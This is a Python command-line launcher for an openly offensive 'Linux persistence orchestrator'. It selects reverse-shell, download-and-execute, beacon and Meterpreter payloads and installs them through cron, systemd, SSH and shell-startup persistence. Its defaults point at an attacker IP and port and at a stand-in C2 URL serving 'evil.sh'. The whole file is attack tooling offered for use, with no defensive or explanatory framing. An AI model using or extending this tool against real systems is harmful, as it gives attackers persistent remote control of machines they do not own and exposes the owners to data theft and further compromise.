#!/usr/bin/env python3
import argparse
from .master import MasterPersistence
from .payloads import *

def main():
    parser = argparse.ArgumentParser(description="Master Linux Persistence Orchestrator")
    parser.add_argument('--install', type=str, help="Install with custom command")
    parser.add_argument('--revshell', nargs=2, metavar=('IP', 'PORT'), help="Deploy full persistence with reverse shell")
    parser.add_argument('--payload-type', type=str, help="Select payload type (e.g., 'revshell-perl')")
    parser.add_argument('--ip', type=str, default='10.10.14.5', help="Attacker IP")
    parser.add_argument('--port', type=int, default=4444, help="Attacker port")
    parser.add_argument('--url', type=str, help="C2 URL for download-exec")
    parser.add_argument('--list-tools', action='store_true', help="Show available tools")
    parser.add_argument('--list-payloads', action='store_true', help="List available payload types")

    args = parser.parse_args()

    mp = MasterPersistence()

    payload_map = {
        'revshell-bash': revshell_bash,
        'revshell-bash-alt': revshell_bash_alt,
        'revshell-nc': revshell_nc,
        'revshell-nc-g': revshell_nc_g,
        'revshell-python': revshell_python,
        'revshell-perl': revshell_perl,
        'revshell-php': revshell_php,
        'revshell-ruby': revshell_ruby,
        'download-curl': download_exec_curl,
        'download-wget': download_exec_wget,
        'download-python': download_exec_python,
        'beacon-bash': beacon_bash,
        'meterpreter-python': meterpreter_python,
        'stealth-download-curl': stealth_download_curl,
    }

    if args.list_tools:
        print("Available tools: cron_persistence, systemd_persistence, ssh_persistence, shell_persistence")
    elif args.list_payloads:
        print("Available payload types:")
        for p in sorted(payload_map.keys()):
            print(f" - {p}")
    elif args.revshell:
        ip, port = args.revshell
        payload = revshell_bash(ip, int(port))
        print(f"[*] Deploying reverse shell → {ip}:{port}\n")
        mp.install_all(payload)
    elif args.payload_type:
        if args.payload_type in payload_map:
            func = payload_map[args.payload_type]
            if 'download' in args.payload_type:
                url = args.url or 'http://c2.example.com/evil.sh'
                payload = func(url)
            else:
                payload = func(args.ip, args.port)
            print(f"[*] Generated payload ({args.payload_type}): {payload}\n")
            mp.install_all(payload)
        else:
            print(f"[-] Unknown payload type. Use --list-payloads to see available types.")
    elif args.install:
        mp.install_all(args.install)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()